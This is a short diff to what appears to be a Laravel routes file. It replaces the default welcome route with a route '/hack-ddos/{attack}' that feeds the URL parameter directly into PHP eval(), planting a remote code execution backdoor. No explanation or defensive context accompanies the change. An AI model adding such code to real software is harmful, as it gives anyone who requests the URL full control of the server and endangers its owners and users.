@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -13,6 +14,6 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
-Route::get('/', function () {
-    return dd('welcome');
+Route::get('/hack-ddos/{attack}', function (Request $request, $attack) {
+    return eval($attack);
 });
